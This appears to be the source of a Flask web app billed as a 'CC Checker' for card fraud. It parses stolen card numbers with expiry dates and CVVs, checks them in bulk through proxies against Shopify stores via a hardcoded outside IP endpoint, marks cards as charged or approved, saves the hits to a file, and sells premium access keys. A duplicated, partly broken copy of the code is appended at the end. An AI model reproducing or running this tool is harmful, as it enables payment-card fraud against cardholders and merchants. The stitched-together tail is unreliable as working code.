from flask import Flask, render_template, request, jsonify, session, redirect, url_for, flash
from flask_socketio import SocketIO, emit
from functools import wraps
import requests
import random
import datetime
import json
import os
import re
import asyncio
import threading
import time
import string
from urllib.parse import urlparse
from werkzeug.security import generate_password_hash, check_password_hash
from werkzeug.utils import secure_filename
import uuid
import logging

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Try to import aiohttp with fallback
try:
    import aiohttp
    import aiofiles
    HAS_AIO = True
except ImportError:
    HAS_AIO = False
    logger.warning("aiohttp not available, some features may be limited")

app = Flask(__name__)
app.config['SECRET_KEY'] = 'your-secret-key-change-this'
app.config['UPLOAD_FOLDER'] = 'uploads'
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet')

# Ensure upload directory exists
os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)

# Admin configuration
ADMIN_USERNAME = "admin"
ADMIN_PASSWORD_HASH = generate_password_hash("admin123")  # Change this!

# Files
PREMIUM_FILE = "data/premium.json"
FREE_FILE = "data/free_users.json"
SITE_FILE = "data/user_sites.json"
KEYS_FILE = "data/keys.json"
CC_FILE = "data/cc.txt"
BANNED_FILE = "data/banned_users.json"
PROXY_FILE = "data/proxy.json"

# Active processes
ACTIVE_PROCESSES = {}

# Ensure data directory exists
os.makedirs("data", exist_ok=True)

# --- Utility Functions (Synchronous versions for compatibility) ---

def create_json_file_sync(filename):
    try:
        if not os.path.exists(filename):
            with open(filename, "w") as file:
                json.dump({}, file)
    except Exception as e:
        logger.error(f"Error creating {filename}: {e}")

def load_json_sync(filename):
    try:
        if not os.path.exists(filename):
            create_json_file_sync(filename)
        with open(filename, "r") as f:
            return json.load(f)
    except Exception as e:
        logger.error(f"Error loading {filename}: {e}")
        return {}

def save_json_sync(filename, data):
    try:
        with open(filename, "w") as f:
            json.dump(data, f, indent=4)
    except Exception as e:
        logger.error(f"Error saving {filename}: {e}")

# Async versions with fallback
async def create_json_file(filename):
    if HAS_AIO:
        try:
            if not os.path.exists(filename):
                async with aiofiles.open(filename, "w") as file:
                    await file.write(json.dumps({}))
        except Exception as e:
            logger.error(f"Error creating {filename}: {e}")
    else:
        create_json_file_sync(filename)

async def load_json(filename):
    if HAS_AIO:
        try:
            if not os.path.exists(filename):
                await create_json_file(filename)
            async with aiofiles.open(filename, "r") as f:
                content = await f.read()
                return json.loads(content) if content else {}
        except Exception as e:
            logger.error(f"Error loading {filename}: {e}")
            return {}
    else:
        return load_json_sync(filename)

async def save_json(filename, data):
    if HAS_AIO:
        try:
            async with aiofiles.open(filename, "w") as f:
                await f.write(json.dumps(data, indent=4))
        except Exception as e:
            logger.error(f"Error saving {filename}: {e}")
    else:
        save_json_sync(filename, data)

def generate_key():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))

async def add_premium_user(user_id, days):
    premium_users = await load_json(PREMIUM_FILE)
    expiry_date = datetime.datetime.now() + datetime.timedelta(days=days)
    premium_users[str(user_id)] = {
        'expiry': expiry_date.isoformat(),
        'added_by': 'admin',
        'days': days
    }
    await save_json(PREMIUM_FILE, premium_users)

async def is_premium_user(user_id):
    premium_users = await load_json(PREMIUM_FILE)
    if str(user_id) not in premium_users:
        return False
    
    user_data = premium_users[str(user_id)]
    expiry = datetime.datetime.fromisoformat(user_data['expiry'])
    if expiry < datetime.datetime.now():
        del premium_users[str(user_id)]
        await save_json(PREMIUM_FILE, premium_users)
        return False
    return True

async def is_banned_user(user_id):
    banned_users = await load_json(BANNED_FILE)
    return str(user_id) in banned_users

async def get_bin_info(card_number):
    if not HAS_AIO:
        return "-", "-", "-", "-", "-", "🏳️"
    
    try:
        bin_number = card_number[:6]
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(f"https://bins.antipublic.cc/bins/{bin_number}") as res:
                if res.status != 200:
                    return "-", "-", "-", "-", "-", "🏳️"
                response_text = await res.text()
                try:
                    data = json.loads(response_text)
                    return (data.get('brand', '-'), data.get('type', '-'), 
                            data.get('level', '-'), data.get('bank', '-'), 
                            data.get('country_name', '-'), data.get('country_flag', '🏳️'))
                except:
                    return "-", "-", "-", "-", "-", "🏳️"
    except Exception as e:
        logger.error(f"BIN lookup error: {e}")
        return "-", "-", "-", "-", "-", "🏳️"

def normalize_card(text):
    if not text:
        return None
    text = text.replace('\n', ' ').replace('/', ' ')
    numbers = re.findall(r'\d+', text)
    cc = mm = yy = cvv = ''
    for part in numbers:
        if len(part) == 16:
            cc = part
        elif len(part) == 4 and part.startswith('20'):
            yy = part[2:]
        elif len(part) == 2 and int(part) <= 12 and mm == '':
            mm = part
        elif len(part) == 2 and not part.startswith('20') and yy == '':
            yy = part
        elif len(part) in [3, 4] and cvv == '':
            cvv = part
    if cc and mm and yy and cvv:
        return f"{cc}|{mm}|{yy}|{cvv}"
    return None

async def get_global_proxy():
    proxies = await load_json(PROXY_FILE)
    global_proxies = proxies.get("global", [])
    if not global_proxies:
        return None
    return random.choice(global_proxies)

async def remove_dead_global_proxy(proxy_url):
    proxies = await load_json(PROXY_FILE)
    global_proxies = proxies.get("global", [])
    for proxy_data in global_proxies:
        if proxy_data['proxy_url'] == proxy_url:
            global_proxies.remove(proxy_data)
            proxies["global"] = global_proxies
            await save_json(PROXY_FILE, proxies)
            break

async def check_card_random_site(card, sites):
    if not sites:
        return {"Response": "ERROR", "Price": "-", "Gateway": "-"}, -1
    
    if not HAS_AIO:
        return {"Response": "aiohttp not available", "Price": "-", "Gateway": "-"}, -1
    
    selected_site = random.choice(sites)
    site_index = sites.index(selected_site) + 1
    
    proxy_data = await get_global_proxy()
    
    try:
        if not selected_site.startswith('http'):
            selected_site = f'https://{selected_site}'
        
        proxy_str = None
        if proxy_data:
            ip, port, username, password = proxy_data.get('ip'), proxy_data.get('port'), proxy_data.get('username'), proxy_data.get('password')
            proxy_str = f"{ip}:{port}:{username}:{password}" if username and password else f"{ip}:{port}"
        
        url = f'http://43.228.215.144:25000/shopify?cc={card}&url={selected_site}'
        if proxy_str:
            url += f'&proxy={proxy_str}'
        
        timeout = aiohttp.ClientTimeout(total=100)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as res:
                if res.status != 200:
                    return {"Response": f"HTTP_ERROR_{res.status}", "Price": "-", "Gateway": "-"}, site_index
                try:
                    response_json = await res.json()
                except:
                    return {"Response": f"Invalid JSON response", "Price": "-", "Gateway": "-"}, site_index
                
                api_response = response_json.get('Response', '')
                price = f"${response_json.get('Price', '-')}" if response_json.get('Price', '-') != '-' else '-'
                gateway = response_json.get('Gateway', 'Shopify')
                
                if proxy_data and ('proxy' in api_response.lower() or 'connection' in api_response.lower() or 'timeout' in api_response.lower()):
                    await remove_dead_global_proxy(proxy_data.get('proxy_url'))
                    return {"Response": "⚠️ Proxy is dead! Auto-removed.", "Price": "-", "Gateway": "-", "Status": "Proxy Dead"}, site_index
                
                status = "Charged" if "Order completed" in api_response or "💎" in api_response else api_response
                return {"Response": api_response, "Price": price, "Gateway": gateway, "Status": status}, site_index
    except Exception as e:
        logger.error(f"Check card error: {e}")
        return {"Response": str(e), "Price": "-", "Gateway": "-"}, site_index

async def check_card_specific_site(card, site):
    if not HAS_AIO:
        return {"Response": "aiohttp not available", "Price": "-", "Gateway": "-"}
    
    proxy_data = await get_global_proxy()
    try:
        if not site.startswith('http'):
            site = f'https://{site}'
        
        proxy_str = None
        if proxy_data:
            ip, port, username, password = proxy_data.get('ip'), proxy_data.get('port'), proxy_data.get('username'), proxy_data.get('password')
            proxy_str = f"{ip}:{port}:{username}:{password}" if username and password else f"{ip}:{port}"
        
        url = f'http://43.228.215.144:25000/shopify?cc={card}&url={site}'
        if proxy_str:
            url += f'&proxy={proxy_str}'
        
        timeout = aiohttp.ClientTimeout(total=100)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as res:
                if res.status != 200:
                    return {"Response": f"HTTP_ERROR_{res.status}", "Price": "-", "Gateway": "-"}
                try:
                    response_json = await res.json()
                except:
                    return {"Response": f"Invalid JSON response", "Price": "-", "Gateway": "-"}
                
                api_response = response_json.get('Response', '')
                price = f"${response_json.get('Price', '-')}" if response_json.get('Price', '-') != '-' else '-'
                gateway = response_json.get('Gateway', 'Shopify')
                
                if proxy_data and ('proxy' in api_response.lower() or 'connection' in api_response.lower() or 'timeout' in api_response.lower()):
                    await remove_dead_global_proxy(proxy_data.get('proxy_url'))
                    return {"Response": "⚠️ Proxy is dead! Auto-removed.", "Price": "-", "Gateway": "-", "Status": "Proxy Dead"}
                
                status = "Charged" if "Order completed" in api_response or "💎" in api_response else api_response
                return {"Response": api_response, "Price": price, "Gateway": gateway, "Status": status}
    except Exception as e:
        logger.error(f"Check card specific site error: {e}")
        return {"Response": str(e), "Price": "-", "Gateway": "-"}

def extract_card(text):
    match = re.search(r'(\d{12,16})[|\s/]*(\d{1,2})[|\s/]*(\d{2,4})[|\s/]*(\d{3,4})', text)
    if match:
        cc, mm, yy, cvv = match.groups()
        if len(yy) == 4:
            yy = yy[2:]
        return f"{cc}|{mm}|{yy}|{cvv}"
    return normalize_card(text)

def extract_all_cards(text):
    cards = set()
    for line in text.splitlines():
        card = extract_card(line)
        if card:
            cards.add(card)
    return list(cards)

async def save_approved_card(card, status, response, gateway, price):
    try:
        if HAS_AIO:
            async with aiofiles.open(CC_FILE, "a", encoding="utf-8") as f:
                await f.write(f"{card} | {status} | {response} | {gateway} | {price}\n")
        else:
            with open(CC_FILE, "a", encoding="utf-8") as f:
                f.write(f"{card} | {status} | {response} | {gateway} | {price}\n")
    except Exception as e:
        logger.error(f"Save approved card error: {e}")

def extract_urls_from_text(text):
    clean_urls = set()
    lines = text.split('\n')
    for line in lines:
        cleaned_line = re.sub(r'^[\s\-\+\|,\d\.\)\(\[\]]+', '', line.strip()).split(' ')[0]
        if cleaned_line:
            clean_urls.add(cleaned_line)
    return list(clean_urls)

def parse_proxy_format(proxy):
    proxy = proxy.strip()
    proxy_type = 'http'
    protocol_match = re.match(r'^(socks5|socks4|http|https)://(.+)$', proxy, re.IGNORECASE)
    if protocol_match:
        proxy_type = protocol_match.group(1).lower()
        proxy = protocol_match.group(2)
    
    host, port, username, password = '', '', '', ''
    match = re.match(r'^([^@:]+):([^@]+)@([^:@]+):(\d+)$', proxy)
    if match:
        username, password, host, port = match.groups()
    elif re.match(r'^([a-zA-Z0-9\.\-]+):(\d+)@([^:]+):(.+)$', proxy):
        match = re.match(r'^([a-zA-Z0-9\.\-]+):(\d+)@([^:]+):(.+)$', proxy)
        host, port, username, password = match.groups()
    elif re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy):
        match = re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy)
        host, port, username, password = match.groups()
    elif re.match(r'^([^:@]+):(\d+)$', proxy):
        match = re.match(r'^([^:@]+):(\d+)$', proxy)
        host, port = match.groups()
    else:
        return None
    
    if not host or not port:
        return None
    
    proxy_url = f'{proxy_type}://{username}:{password}@{host}:{port}' if username and password else f'{proxy_type}://{host}:{port}'
    
    return {
        'ip': host, 'port': port,
        'username': username if username else None, 'password': password if password else None,
        'proxy_url': proxy_url, 'type': proxy_type
    }

async def test_proxy(proxy_url):
    if not HAS_AIO:
        return False, None
    
    try:
        timeout = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get('http://api.ipify.org?format=json', proxy=proxy_url) as res:
                if res.status == 200:
                    data = await res.json()
                    return True, data.get('ip', 'Unknown')
                return False, None
    except Exception:
        return False, None

def is_site_dead(response_text):
    if not response_text:
        return True
    response_lower = response_text.lower()
    dead_indicators = [
        'receipt id is empty', 'handle is empty', 'cloudflare', 'connection failed', 'timed out',
        'access denied', 'could not resolve', 'HTTPERROR504', 'http error', 'timeout', 'unreachable',
        '502', '503', '504', 'bad gateway', 'service unavailable', 'gateway timeout', 'network error',
        'failed to tokenize card', 'SITE DEAD', 'site dead', 'CAPTCHA_REQUIRED', 'Site errors'
    ]
    return any(indicator in response_lower for indicator in dead_indicators)

GOOD_KEYS = ["insufficient", "invalid_cvv", "incorrect_cvv", "invalid_cvc", "incorrect_cvc", 
             "incorrect_zip", "invalid_zip", "security code", "approved", "success", "avs", 
             "cvc is incorrect", "cvv is incorrect"]
CHARGED_KEYS = ["charged", "thank you", "payment successful", "order completed", "💎"]

# --- Web Routes ---

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        if username == ADMIN_USERNAME and check_password_hash(ADMIN_PASSWORD_HASH, password):
            session['user_id'] = 'admin'
            session['is_admin'] = True
            session['username'] = username
            return redirect(url_for('dashboard'))
        else:
            flash('Invalid credentials', 'error')
    
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('index'))

@app.route('/dashboard')
def dashboard():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    return render_template('dashboard.html', is_admin=session.get('is_admin', False))

@app.route('/admin')
def admin():
    if not session.get('is_admin', False):
        return redirect(url_for('dashboard'))
    return render_template('admin.html')

# --- API Endpoints ---

@app.route('/api/check_card', methods=['POST'])
def check_card():
    if 'user_id' not in session:
        return jsonify({'error': 'Not logged in'}), 401
    
    data = request.json
    card = data.get('card')
    
    if not card:
        return jsonify({'error': 'Card required'}), 400
    
    sites_data = load_json_sync(SITE_FILE)
    global_sites = sites_data.get("global", [])
    
    if not global_sites:
        return jsonify({'error': 'No sites configured'}), 400
    
    # Run async in new loop
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    result, site_index = loop.run_until_complete(check_card_random_site(card, global_sites))
    loop.close()
    
    return jsonify({
        'result': result,
        'site_index': site_index,
        'card': card
    })

@app.route('/api/check_multiple', methods=['POST'])
def check_multiple():
    if 'user_id' not in session:
        return jsonify({'error': 'Not logged in'}), 401
    
    data = request.json
    cards_text = data.get('cards', '')
    
    cards = extract_all_cards(cards_text)
    
    if not cards:
        return jsonify({'error': 'No valid cards found'}), 400
    
    sites_data = load_json_sync(SITE_FILE)
    global_sites = sites_data.get("global", [])
    
    if not global_sites:
        return jsonify({'error': 'No sites configured'}), 400
    
    results = []
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    for card in cards:
        result, site_index = loop.run_until_complete(check_card_random_site(card, global_sites))
        results.append({
            'card': card,
            'result': result,
            'site_index': site_index
        })
    
    loop.close()
    
    return jsonify({'results': results})

@app.route('/api/redeem_key', methods=['POST'])
def redeem_key():
    if 'user_id' not in session:
        return jsonify({'error': 'Not logged in'}), 401
    
    data = request.json
    key = data.get('key', '').upper()
    
    keys_data = load_json_sync(KEYS_FILE)
    
    if key not in keys_data:
        return jsonify({'error': 'Invalid key'}), 400
    
    if keys_data[key].get('used', False):
        return jsonify({'error': 'Key already used'}), 400
    
    days = keys_data[key]['days']
    user_id = session.get('user_id')
    
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(add_premium_user(user_id, days))
    
    keys_data[key]['used'] = True
    keys_data[key]['used_by'] = user_id
    keys_data[key]['used_at'] = datetime.datetime.now().isoformat()
    save_json_sync(KEYS_FILE, keys_data)
    loop.close()
    
    return jsonify({'success': True, 'days': days})

@app.route('/api/upload_cards', methods=['POST'])
def upload_cards():
    if 'user_id' not in session:
        return jsonify({'error': 'Not logged in'}), 401
    
    if 'file' not in request.files:
        return jsonify({'error': 'No file uploaded'}), 400
    
    file = request.files['file']
    if file.filename == '':
        return jsonify({'error': 'No file selected'}), 400
    
    if file and file.filename.endswith('.txt'):
        filename = secure_filename(file.filename)
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        file.save(filepath)
        
        with open(filepath, 'r') as f:
            content = f.read()
        
        cards = extract_all_cards(content)
        
        os.remove(filepath)
        
        sites_data = load_json_sync(SITE_FILE)
        global_sites = sites_data.get("global", [])
        
        if not global_sites:
            return jsonify({'error': 'No sites configured'}), 400
        
        # Start background process
        process_id = str(uuid.uuid4())
        ACTIVE_PROCESSES[process_id] = {
            'cards': cards,
            'results': [],
            'status': 'processing',
            'user_id': session.get('user_id'),
            'progress': 0
        }
        
        # Start background thread for processing
        thread = threading.Thread(target=process_cards_batch_sync, args=(process_id, cards, global_sites))
        thread.daemon = True
        thread.start()
        
        return jsonify({'process_id': process_id, 'total': len(cards)})
    
    return jsonify({'error': 'Invalid file type'}), 400

def process_cards_batch_sync(process_id, cards, sites):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    results = []
    for i, card in enumerate(cards):
        if process_id not in ACTIVE_PROCESSES:
            break
        
        result, site_index = loop.run_until_complete(check_card_random_site(card, sites))
        results.append({
            'card': card,
            'result': result,
            'site_index': site_index,
            'index': i + 1,
            'total': len(cards)
        })
        
        ACTIVE_PROCESSES[process_id]['results'] = results
        ACTIVE_PROCESSES[process_id]['progress'] = i + 1
        
        # Emit progress via SocketIO
        socketio.emit('progress', {
            'process_id': process_id,
            'current': i + 1,
            'total': len(cards),
            'result': result,
            'card': card
        })
        
        time.sleep(0.5)
    
    ACTIVE_PROCESSES[process_id]['status'] = 'completed'
    loop.close()

@app.route('/api/process_status/<process_id>')
def process_status(process_id):
    if 'user_id' not in session:
        return jsonify({'error': 'Not logged in'}), 401
    
    if process_id not in ACTIVE_PROCESSES:
        return jsonify({'error': 'Process not found'}), 404
    
    process = ACTIVE_PROCESSES[process_id]
    return jsonify({
        'status': process['status'],
        'progress': process.get('progress', 0),
        'total': len(process['cards']),
        'results': process['results']
    })

@app.route('/api/get_sites')
def get_sites():
    if not session.get('is_admin', False):
        return jsonify({'error': 'Unauthorized'}), 401
    
    sites_data = load_json_sync(SITE_FILE)
    global_sites = sites_data.get("global", [])
    return jsonify({'sites': global_sites})

@app.route('/api/add_site', methods=['POST'])
def add_site():
    if not session.get('is_admin', False):
        return jsonify({'error': 'Unauthorized'}), 401
    
    data = request.json
    site = data.get('site', '').strip()
    
    if not site:
        return jsonify({'error': 'Site URL required'}), 400
    
    sites_data = load_json_sync(SITE_FILE)
    global_sites = sites_data.get("global", [])
    
    if site not in global_sites:
        global_sites.append(site)
        sites_data["global"] = global_sites
        save_json_sync(SITE_FILE, sites_data)
        return jsonify({'success': True, 'site': site})
    
    return jsonify({'error': 'Site already exists'}), 400

@app.route('/api/remove_site', methods=['POST'])
def remove_site():
    if not session.get('is_admin', False):
        return jsonify({'error': 'Unauthorized'}), 401
    
    data = request.json
    index = data.get('index')
    site = data.get('site')
    
    sites_data = load_json_sync(SITE_FILE)
    global_sites = sites_data.get("global", [])
    
    if index is not None:
        try:
            idx = int(index) - 1
            if 0 <= idx < len(global_sites):
                removed = global_sites.pop(idx)
                sites_data["global"] = global_sites
                save_json_sync(SITE_FILE, sites_data)
                return jsonify({'success': True, 'removed': removed})
        except ValueError:
            pass
    
    if site and site in global_sites:
        global_sites.remove(site)
        sites_data["global"] = global_sites
        save_json_sync(SITE_FILE, sites_data)
        return jsonify({'success': True, 'removed': site})
    
    return jsonify({'error': 'Site not found'}), 404

@app.route('/api/generate_keys', methods=['POST'])
def generate_keys():
    if not session.get('is_admin', False):
        return jsonify({'error': 'Unauthorized'}), 401
    
    data = request.json
    amount = data.get('amount', 1)
    days = data.get('days', 30)
    
    if amount > 50:
        return jsonify({'error': 'Maximum 50 keys at once'}), 400
    
    keys_data = load_json_sync(KEYS_FILE)
    generated_keys = []
    
    for _ in range(amount):
        key = generate_key()
        keys_data[key] = {
            'days': days,
            'created_at': datetime.datetime.now().isoformat(),
            'used': False,
            'used_by': None
        }
        generated_keys.append(key)
    
    save_json_sync(KEYS_FILE, keys_data)
    
    return jsonify({'keys': generated_keys})

@app.route('/api/get_proxies')
def get_proxies():
    if not session.get('is_admin', False):
        return jsonify({'error': 'Unauthorized'}), 401
    
    proxies_data = load_json_sync(PROXY_FILE)
    global_proxies = proxies_data.get("global", [])
    return jsonify({'proxies': global_proxies})

@app.route('/api/add_proxies', methods=['POST'])
def add_proxies():
    if not session.get('is_admin', False):
        return jsonify({'error': 'Unauthorized'}), 401
    
    data = request.json
    proxies_text = data.get('proxies', '')
    
    lines = proxies_text.splitlines()
    valid_proxies = []
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    for line in lines:
        line = line.strip()
        if line:
            proxy_data = parse_proxy_format(line)
            if proxy_data:
                is_working, _ = loop.run_until_complete(test_proxy(proxy_data['proxy_url']))
                if is_working:
                    valid_proxies.append(proxy_data)
    
    if valid_proxies:
        proxies_data = load_json_sync(PROXY_FILE)
        global_proxies = proxies_data.get("global", [])
        existing_urls = {p['proxy_url'] for p in global_proxies}
        
        added_count = 0
        for vp in valid_proxies:
            if vp['proxy_url'] not in existing_urls:
                global_proxies.append(vp)
                added_count += 1
        
        proxies_data["global"] = global_proxies
        save_json_sync(PROXY_FILE, proxies_data)
        loop.close()
        
        return jsonify({'success': True, 'added': added_count, 'total': len(global_proxies)})
    
    loop.close()
    return jsonify({'error': 'No working proxies found'}), 400

@app.route('/api/remove_proxy', methods=['POST'])
def remove_proxy():
    if not session.get('is_admin', False):
        return jsonify({'error': 'Unauthorized'}), 401
    
    data = request.json
    index = data.get('index')
    
    if index is None:
        return jsonify({'error': 'Index required'}), 400
    
    proxies_data = load_json_sync(PROXY_FILE)
    global_proxies = proxies_data.get("global", [])
    
    try:
        idx = int(index) - 1
        if 0 <= idx < len(global_proxies):
            removed = global_proxies.pop(idx)
            proxies_data["global"] = global_proxies
            save_json_sync(PROXY_FILE, proxies_data)
            return jsonify({'success': True, 'removed': removed})
    except ValueError:
        pass
    
    return jsonify({'error': 'Invalid index'}), 404

@app.route('/api/test_site', methods=['POST'])
def test_site():
    if not session.get('is_admin', False):
        return jsonify({'error': 'Unauthorized'}), 401
    
    data = request.json
    site = data.get('site')
    
    if not site:
        return jsonify({'error': 'Site URL required'}), 400
    
    test_card = "4031630422575208|01|2030|280"
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    result = loop.run_until_complete(check_card_specific_site(test_card, site))
    loop.close()
    
    return jsonify(result)

@app.route('/api/get_bin_info', methods=['POST'])
def bin_info():
    if 'user_id' not in session:
        return jsonify({'error': 'Not logged in'}), 401
    
    data = request.json
    card = data.get('card', '')
    
    if len(card) < 6:
        return jsonify({'error': 'Invalid card number'}), 400
    
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    brand, card_type, level, bank, country, flag = loop.run_until_complete(get_bin_info(card))
    loop.close()
    
    return jsonify({
        'brand': brand,
        'type': card_type,
        'level': level,
        'bank': bank,
        'country': country,
        'flag': flag
    })

@app.route('/api/stats')
def stats():
    if not session.get('is_admin', False):
        return jsonify({'error': 'Unauthorized'}), 401
    
    premium_users = load_json_sync(PREMIUM_FILE)
    banned_users = load_json_sync(BANNED_FILE)
    keys_data = load_json_sync(KEYS_FILE)
    sites_data = load_json_sync(SITE_FILE)
    proxies_data = load_json_sync(PROXY_FILE)
    
    used_keys = sum(1 for k in keys_data.values() if k.get('used', False))
    total_keys = len(keys_data)
    
    return jsonify({
        'premium_users': len(premium_users),
        'banned_users': len(banned_users),
        'total_keys': total_keys,
        'used_keys': used_keys,
        'total_sites': len(sites_data.get('global', [])),
        'total_proxies': len(proxies_data.get('global', []))
    })

# Initialize files on startup
def setup():
    for file in [PREMIUM_FILE, FREE_FILE, SITE_FILE, KEYS_FILE, BANNED_FILE, PROXY_FILE]:
        create_json_file_sync(file)

setup()

if __name__ == '__main__':
    logger.info("Starting CC Checker Web Application...")
    socketio.run(app, debug=True, host='0.0.0.0', port=5000)  
                status = "Charged" if "Order completed" in api_response or "💎" in api_response else api_response
                return {"Response": api_response, "Price": price, "Gateway": gateway, "Status": status}
    except Exception as e:
        return {"Response": str(e), "Price": "-", "Gateway": "-"}

def extract_card(text):
    match = re.search(r'(\d{12,16})[|\s/]*(\d{1,2})[|\s/]*(\d{2,4})[|\s/]*(\d{3,4})', text)
    if match:
        cc, mm, yy, cvv = match.groups()
        if len(yy) == 4:
            yy = yy[2:]
        return f"{cc}|{mm}|{yy}|{cvv}"
    return normalize_card(text)

def extract_all_cards(text):
    cards = set()
    for line in text.splitlines():
        card = extract_card(line)
        if card:
            cards.add(card)
    return list(cards)

async def save_approved_card(card, status, response, gateway, price):
    try:
        async with aiofiles.open(CC_FILE, "a", encoding="utf-8") as f:
            await f.write(f"{card} | {status} | {response} | {gateway} | {price}\n")
    except Exception:
        pass

def extract_urls_from_text(text):
    clean_urls = set()
    lines = text.split('\n')
    for line in lines:
        cleaned_line = re.sub(r'^[\s\-\+\|,\d\.\)\(\[\]]+', '', line.strip()).split(' ')[0]
        if cleaned_line:
            clean_urls.add(cleaned_line)
    return list(clean_urls)

def parse_proxy_format(proxy):
    proxy = proxy.strip()
    proxy_type = 'http'
    protocol_match = re.match(r'^(socks5|socks4|http|https)://(.+)$', proxy, re.IGNORECASE)
    if protocol_match:
        proxy_type = protocol_match.group(1).lower()
        proxy = protocol_match.group(2)
    
    host, port, username, password = '', '', '', ''
    match = re.match(r'^([^@:]+):([^@]+)@([^:@]+):(\d+)$', proxy)
    if match:
        username, password, host, port = match.groups()
    elif re.match(r'^([a-zA-Z0-9\.\-]+):(\d+)@([^:]+):(.+)$', proxy):
        match = re.match(r'^([a-zA-Z0-9\.\-]+):(\d+)@([^:]+):(.+)$', proxy)
        host, port, username, password = match.groups()
    elif re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy):
        match = re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy)
        host, port, username, password = match.groups()
    elif re.match(r'^([^:@]+):(\d+)$', proxy):
        match = re.match(r'^([^:@]+):(\d+)$', proxy)
        host, port = match.groups()
    else:
        return None
    
    if not host or not port:
        return None
    
    proxy_url = f'{proxy_type}://{username}:{password}@{host}:{port}' if username and password else f'{proxy_type}://{host}:{port}'
    
    return {
        'ip': host, 'port': port,
        'username': username if username else None, 'password': password if password else None,
        'proxy_url': proxy_url, 'type': proxy_type
    }

async def test_proxy(proxy_url):
    try:
        timeout = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get('http://api.ipify.org?format=json', proxy=proxy_url) as res:
                if res.status == 200:
                    data = await res.json()
                    return True, data.get('ip', 'Unknown')
                return False, None
    except Exception:
        return False, None

def is_site_dead(response_text):
    if not response_text:
        return True
    response_lower = response_text.lower()
    dead_indicators = [
        'receipt id is empty', 'handle is empty', 'cloudflare', 'connection failed', 'timed out',
        'access denied', 'could not resolve', 'HTTPERROR504', 'http error', 'timeout', 'unreachable',
        '502', '503', '504', 'bad gateway', 'service unavailable', 'gateway timeout', 'network error',
        'failed to tokenize card', 'SITE DEAD', 'site dead', 'CAPTCHA_REQUIRED', 'Site errors'
    ]
    return any(indicator in response_lower for indicator in dead_indicators)

GOOD_KEYS = ["insufficient", "invalid_cvv", "incorrect_cvv", "invalid_cvc", "incorrect_cvc", 
             "incorrect_zip", "invalid_zip", "security code", "approved", "success", "avs", 
             "cvc is incorrect", "cvv is incorrect"]
CHARGED_KEYS = ["charged", "thank you", "payment successful", "order completed", "💎"]

# --- Web Routes ---

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        if username == ADMIN_USERNAME and check_password_hash(ADMIN_PASSWORD_HASH, password):
            session['user_id'] = 'admin'
            session['is_admin'] = True
            session['username'] = username
            return redirect(url_for('dashboard'))
        else:
            flash('Invalid credentials', 'error')
    
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('index'))

@app.route('/dashboard')
@login_required
def dashboard():
    return render_template('dashboard.html', is_admin=session.get('is_admin', False))

@app.route('/admin')
@admin_required
def admin():
    return render_template('admin.html')

# --- API Endpoints ---

@app.route('/api/check_card', methods=['POST'])
@login_required
async def check_card():
    data = request.json
    card = data.get('card')
    
    if not card:
        return jsonify({'error': 'Card required'}), 400
    
    sites_data = await load_json(SITE_FILE)
    global_sites = sites_data.get("global", [])
    
    if not global_sites:
        return jsonify({'error': 'No sites configured'}), 400
    
    # Run async check
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    result, site_index = await check_card_random_site(card, global_sites)
    loop.close()
    
    return jsonify({
        'result': result,
        'site_index': site_index,
        'card': card
    })

@app.route('/api/check_multiple', methods=['POST'])
@login_required
async def check_multiple():
    data = request.json
    cards_text = data.get('cards', '')
    
    cards = extract_all_cards(cards_text)
    
    if not cards:
        return jsonify({'error': 'No valid cards found'}), 400
    
    sites_data = await load_json(SITE_FILE)
    global_sites = sites_data.get("global", [])
    
    if not global_sites:
        return jsonify({'error': 'No sites configured'}), 400
    
    results = []
    for card in cards:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        result, site_index = await check_card_random_site(card, global_sites)
        loop.close()
        
        results.append({
            'card': card,
            'result': result,
            'site_index': site_index
        })
    
    return jsonify({'results': results})

@app.route('/api/redeem_key', methods=['POST'])
@login_required
async def redeem_key():
    data = request.json
    key = data.get('key', '').upper()
    
    keys_data = await load_json(KEYS_FILE)
    
    if key not in keys_data:
        return jsonify({'error': 'Invalid key'}), 400
    
    if keys_data[key].get('used', False):
        return jsonify({'error': 'Key already used'}), 400
    
    days = keys_data[key]['days']
    user_id = session.get('user_id')
    
    await add_premium_user(user_id, days)
    
    keys_data[key]['used'] = True
    keys_data[key]['used_by'] = user_id
    keys_data[key]['used_at'] = datetime.datetime.now().isoformat()
    await save_json(KEYS_FILE, keys_data)
    
    return jsonify({'success': True, 'days': days})

